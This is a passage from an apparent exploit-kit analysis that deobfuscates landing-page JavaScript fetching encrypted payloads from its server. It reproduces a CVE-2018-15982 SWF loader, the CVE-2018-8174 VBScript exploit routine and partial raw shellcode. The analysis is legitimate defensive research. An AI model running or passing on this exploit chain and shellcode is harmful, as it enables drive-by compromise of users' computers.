<span class="p">)[</span><span class="dl">"</span><span class="s2">lIlIlll11l</span><span class="dl">"</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">Il11I1II</span><span class="dl">"</span><span class="p">]);</span>
</code></pre></div></div>

<p>Then, as before, the function is called. Let’s look at the function. First, define the necessary data for encryption/decryption as before. Give each one a name as before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// str_A2</span>
<span class="kd">var</span> <span class="nx">l1ll1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]();</span>
<span class="c1">// str_B2</span>
<span class="kd">var</span> <span class="nx">lIlII11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_C2</span>
<span class="kd">var</span> <span class="nx">ll1l1IlIIIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_D2</span>
<span class="kd">var</span> <span class="nx">lll1II</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span><span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_E2 =&gt; str_B2.powMod(str_C2, str_D2)</span>
<span class="kd">var</span> <span class="nx">l11IlIl</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span><span class="nx">lll1II</span><span class="p">);</span>
</code></pre></div></div>

<p>Next, prepare the data to send as a POST request. Unlike before, Adobe Flash Player version information is also sent.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">l11IlIIlllll</span> <span class="o">=</span> <span class="p">{};</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlII11</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_B2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lll1II</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lll1II</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>      <span class="c1">// str_D2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l11IlIl</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l11IlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_E2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lI1lIl1Ill</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1ll1</span><span class="p">;</span>                     <span class="c1">// str_A2</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1l1IlI</span><span class="dl">'</span><span class="p">]();</span>          <span class="c1">// browser check data</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l111I</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l111I</span><span class="dl">'</span><span class="p">];</span>            <span class="c1">// Adobe Flash Player version check data</span>
</code></pre></div></div>

<p>The sending process is the same as the previous one. The key and IV used in this case are also initial values.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">I1l1I1</span><span class="dl">'</span><span class="p">](</span><span class="nx">Il1I11l</span><span class="p">,</span><span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span><span class="nx">l11l1I1</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>

<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1lllIIlI</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">,</span>
    <span class="c1">// aes_encrypt</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Ill1lI1Ill</span><span class="dl">'</span><span class="p">](</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">IIII1Il</span><span class="dl">'</span><span class="p">](</span><span class="nx">l11IlIIlllll</span><span class="p">),</span>    <span class="c1">// POST Data</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                   <span class="c1">// key</span>
        <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]}</span>     <span class="c1">// iv</span>
    <span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]()</span>
<span class="p">);</span>
</code></pre></div></div>

<p>Thus, <code class="language-plaintext highlighter-rouge">onreadystatechange</code> is called as well. Here too, the decoding process is performed as before. First, decode POST response data with the same key and IV as before.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="kd">var</span> <span class="nx">lIlIl1IIl11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">Il1I11l</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">],</span>                <span class="c1">// enc_data</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">III1l1</span><span class="dl">'</span><span class="p">],</span>                       <span class="c1">// key</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">II1ll11I</span><span class="dl">'</span><span class="p">]}</span>         <span class="c1">// iv</span>
<span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">Il11I1II</span><span class="dl">'</span><span class="p">]);</span>
</code></pre></div></div>

<p>When jsonify the decoded result, three data are included like this. The first 32-character hexadecimal string is called str_F2.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"lIlll1IIlI"</span><span class="p">:</span><span class="w"> </span><span class="s2">"87e087b48d4b06215f486021f23f5470"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"lIIIIllIl1"</span><span class="p">:</span><span class="w"> </span><span class="s2">"oUeRtTwLk9lLYqMwZC3AM49H8HDw15IqymZ0W</span><span class="se">\/</span><span class="s2">vw87Vd9RtdXhps9ZppZc</span><span class="se">\/</span><span class="s2">INO01Bqk79BOMS9ykHCDPE</span><span class="se">\/\/</span><span class="s2">kWCHQuuh0</span><span class="se">\/</span><span class="s2">rr…"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"II11lIl11"</span><span class="p">:</span><span class="w"> </span><span class="s2">"88HY4nkc9TWmnRPi</span><span class="se">\/</span><span class="s2">hEPmk8ZCTJ5tIwItosOTmqFjUBFxCXfoXdMKas+TeKLUbdwsXAhvGa35wNmMnajdPzt1huWerzwnhoGcFP…"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Decrypt these data. Thus two data are decoded.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">lIlll1IIlI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlll1IIlI</span><span class="dl">'</span><span class="p">],</span><span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_G2 =&gt; str_F2.modPow(str_C2, str_D2)</span>
<span class="kd">var</span> <span class="nx">llIIlI</span> <span class="o">=</span> <span class="nx">lIlll1IIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span><span class="nx">lll1II</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="nx">llIIlI</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">IIIIlI1IllII</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">-</span> <span class="nx">I1Il1I1</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
<span class="k">while</span><span class="p">(</span><span class="nx">IIIIlI1IllII</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">I1Il1I1</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="o">+</span><span class="nx">I1Il1I1</span><span class="p">;</span>
    <span class="nx">IIIIlI1IllII</span><span class="o">--</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">var</span> <span class="nx">II1ll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">I1Il1I1</span><span class="p">);</span>       <span class="c1">// str_G2</span>
<span class="kd">var</span> <span class="nx">lI1lIl1Ill</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">IIIlI</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1lI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">ll1llI1</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1ll1</span><span class="p">);</span>    <span class="c1">// str_A2</span>

<span class="c1">// aes_decrypt()</span>
<span class="kd">var</span> <span class="nx">I1II111I1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIIIIllIl1</span><span class="dl">'</span><span class="p">],</span>       <span class="c1">// enc_data_1</span>
    <span class="nx">II1ll</span><span class="p">,</span>                      <span class="c1">// str_G2</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span><span class="p">}</span>    <span class="c1">// str_A2</span>
<span class="p">);</span>

<span class="kd">var</span> <span class="nx">IIIIl</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lI11lIl</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">l11II11l</span><span class="dl">'</span><span class="p">](</span>
    <span class="nx">l1I1l1</span><span class="p">[</span><span class="dl">'</span><span class="s1">II11lIl11</span><span class="dl">'</span><span class="p">],</span>        <span class="c1">// enc_data_2</span>
    <span class="nx">II1ll</span><span class="p">,</span>                      <span class="c1">// str_G2</span>
    <span class="p">{</span><span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">lI1lIl1Ill</span><span class="p">}</span>    <span class="c1">// str_A2</span>
<span class="p">);</span>
</code></pre></div></div>

<p>The data thus decoded is written to Body and executed. The decoded data is the CVE-2018-8174 exploit code and the CVE-2018-15982 exploit code for reading swf loader.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nx">IlIII1lll</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="kd">var</span> <span class="nx">IIlIl</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
	<span class="nx">IIlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">IlIlll1I1</span><span class="dl">"</span><span class="p">);</span>
	<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">IIlIl</span><span class="p">);</span>
	<span class="kd">var</span> <span class="nx">I11I11IIlIII</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">IlIlll1I1</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">IlIII1lll</span><span class="p">);</span>
	<span class="nx">I11I11IIlIII</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">lIl1l1I</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">l1III11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">createElement</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">l1III11</span><span class="p">[</span><span class="dl">'</span><span class="s1">setAttribute</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">id</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">lII1I1IlI1I</span><span class="dl">"</span><span class="p">);</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementsByTagName</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">BODY</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">l1III11</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">llIll1lI</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getElementById</span><span class="dl">'</span><span class="p">](</span><span class="dl">"</span><span class="s2">lII1I1IlI1I</span><span class="dl">"</span><span class="p">)[</span><span class="dl">'</span><span class="s1">contentWindow</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">];</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">]();</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">write</span><span class="dl">'</span><span class="p">](</span><span class="nx">lIl1l1I</span><span class="p">);</span>
    <span class="nx">llIll1lI</span><span class="p">[</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">]();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>For swf loader, the following code is executed.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"x-ua-compatible"</span> <span class="na">content=</span><span class="s">"IE=10"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"BnjJbx"</span><span class="nt">&gt;&lt;object</span> <span class="na">classid=</span><span class="s">"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"</span> <span class="na">width=</span><span class="s">"205"</span> <span class="na">height=</span><span class="s">"528"</span> <span class="na">id=</span><span class="s">"BnjJbx"</span> <span class="na">align=</span><span class="s">"middle"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"movie"</span> <span class="na">value=</span><span class="s">"/24_02_1964/05_04_1933/3410-Skegger-12666"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"quality"</span> <span class="na">value=</span><span class="s">"high"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"bgcolor"</span> <span class="na">value=</span><span class="s">"#ffffff"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"play"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"loop"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"wmode"</span> <span class="na">value=</span><span class="s">"window"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"scale"</span> <span class="na">value=</span><span class="s">"showall"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"menu"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"devicefont"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"salign"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"allowScriptAccess"</span> <span class="na">value=</span><span class="s">"sameDomain"</span> <span class="nt">/&gt;&lt;/object&gt;&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Thus, the swf file that exploits CVE-2018-15982 is read and executed.</p>

<h2 id="cve-2018-8174">CVE-2018-8174</h2>
<p>The exploit code used is very similar to PoC.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">StartExploit</span>
	<span class="n">UAF</span>
	<span class="n">InitObjects</span>
	<span class="n">vb_adrr</span><span class="o">=</span><span class="n">LeakVBAddr</span><span class="p">()</span>
	<span class="n">vbs_base</span><span class="o">=</span><span class="n">GetBaseByDOSmodeSearch</span><span class="p">(</span><span class="n">GetUint32</span><span class="p">(</span><span class="n">vb_adrr</span><span class="p">))</span>
	<span class="n">msv_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">vbs_base</span><span class="p">,</span><span class="s">"msvcrt.dll"</span><span class="p">)</span>
	<span class="n">krb_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">msv_base</span><span class="p">,</span><span class="s">"kernelbase.dll"</span><span class="p">)</span>
	<span class="n">ntd_base</span><span class="o">=</span><span class="n">GetBaseFromImport</span><span class="p">(</span><span class="n">msv_base</span><span class="p">,</span><span class="s">"ntdll.dll"</span><span class="p">)</span>
	<span class="n">VirtualProtectAddr</span><span class="o">=</span><span class="n">GetProcAddr</span><span class="p">(</span><span class="n">krb_base</span><span class="p">,</span><span class="s">"VirtualProtect"</span><span class="p">)</span>
	<span class="n">NtContinueAddr</span><span class="o">=</span><span class="n">GetProcAddr</span><span class="p">(</span><span class="n">ntd_base</span><span class="p">,</span><span class="s">"NtContinue"</span><span class="p">)</span>
	<span class="n">SetMemValue</span> <span class="n">GetShellcode</span><span class="p">()</span>
	<span class="n">ShellcodeAddr</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span><span class="o">+</span><span class="mi">8</span>
	<span class="n">SetMemValue</span> <span class="n">WrapShellcodeWithNtContinueContext</span><span class="p">(</span><span class="n">ShellcodeAddr</span><span class="p">)</span>
	<span class="n">lIlll</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span><span class="o">+</span><span class="mi">69596</span>
	<span class="n">SetMemValue</span> <span class="n">ExpandWithVirtualProtect</span><span class="p">(</span><span class="n">lIlll</span><span class="p">)</span>
	<span class="n">llIIll</span><span class="o">=</span><span class="n">GetMemValue</span><span class="p">()</span>
	<span class="n">ExecuteShellcode</span>
<span class="k">End</span> <span class="k">Sub</span>
<span class="n">StartExploit</span>
</code></pre></div></div>

<p>The process to generate shellcode is like this.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Function</span> <span class="nf">GetShellcode</span><span class="p">()</span>
	<span class="n">IIlI</span><span class="o">=</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u0000%u0000%u0000%u0000"</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">Unescape</span><span class="p">(</span><span class="s">"%u8B55%u83EC%uF8E4%uEC81%u00CC%u0000%u5653%uE857%u08B0%u0000%uF08B%u44C7%u1824%u05CD%u5379%u848D%uB024%u0000%u8900%u2474%u8934%u2444%u8D14%u2454%u8D10%u2444%uC744%u2444%u1D1C%u2BDE%u8982%u2444%u8D10%u244C%u8D14%u2484%u0094%u0000%u4489%u2824%u448D%u1824%u8D50%u2444%u502C%u1EE8%u0006%u8B00%u245C%u8D18%u244C%u8B18%u247C%u8B1C%u8903%u2444%u8B40%u1C47%u4489%u4424%u478B%u8920%u2444%u3348%u89C0%u2444%u8918%u2444%u891C%u2444%uE834%u02E9%u0000%u548D%u1C24%uCF8B%u66E8%u0002%u8300%u2464%u0038%u4C8D%u2024%u406A%uE856%u02FE%u0000%uC683%u8D40%u244C%u6828%u0080%u0000%uE856%u02EC%u0000%u74FF%u2C24%u4C8B%u5024%u448D%u4824%u74FF%u2C24%uD68B%u74FF%u4824%u5753%u8D50%u2444%u5060%u448D%u4C24%uE850%u0389%u0000%uDB33%uC483%u3938%u245C%u742C%u8B41%u2474%u8D38%u2444%u6A48%u5F44%u5357%uFF50%u83D6%u0CC4%u7C89%u4824%u448D%u1824%u106A%u5053%uD6FF%uC483%u8D0C%u2444%u5018%u448D%u4C24%u5350%u6853%u0000%u0800%u5353%uFF53%u2474%u5350%u54FF%u6424%uFF53%u2454%u5F44%u5B5E%uE58B%uC35D%u8B55%u83EC%u0CEC%u458B%u890C%uF445%u458B%u8908%uF845%u6583%u00FC%u07EB%u458B%u40FC%u4589%u8BFC%uFC45%u453B%u7310%u8B12%uF845%u4503%u8BFC%uF44D%u4D03%u8AFC%u8809%uEB08%uC9DF%u55C3%uEC8B%u458B%u0F08%u00BE%uC085%u2D74%u458B%u0F08%u00BE%uF883%u7C41%u8B19%u0845%uBE0F%u8300%u5AF8%u0E7F%u458B%u0F08%u00BE%uC083%u8B20%u084D%u0188%u458B%u4008%u4589%uEB08%u5DC9%u55C3%uEC8B%u8B51%u0845%u4589%uEBFC%u8B07%uFC45%u8940%uFC45%u458B%u0FFC%u00BE%uC085%u0274%uEDEB%u458B%u2BFC%u0845%uC3C9%u5653%u8B57%u33D9%u53FF%u3347%uE8F6%uFFC9%uFFFF%u8B59%u85C8%u74C9%u0F24%u03B6%uD233%uC703%uF1BF%u00FF%uF700%u43F7%uFA8B%uD233%u048D%uBE3E%uFFF1%u0000%uF6F7%uF28B%uE983%u7501%uC1DC%u10E6%u048D%u5F37%u5B5E%u55C3%uEC8B%uEC83%u5310%u5756%uF98B%u5589%u33FC%u8BF6%u3C47%u5C8B%u7838%uDF03%u438B%u8B1C%u204B%uC703%u4589%u03F0%u8BCF%u2443%uC703%u4D89%u89F8%uF445%u7339%u7618%u8B18%uB10C%uCF03%u7BE8%uFFFF%u3BFF%uFC45%u1074%u4D8B%u46F8%u733B%u7218%u33E8%u5FC0%u5B5E%uC3C9%u458B%u8BF4%uF04D%uB70F%u7004%u048B%u0381%uEBC7%u64EA%u30A1%u0000%u8B00%u0C40%u408B%u8B14%u8B00%u8B00%u1040%u64C3%u30A1%u0000%u8B00%u0C40%u408B%u8B14%u8B00%u1040%u56C3%u8B57%u8BF9%u56F2%u078B%uD0FF%uC085%u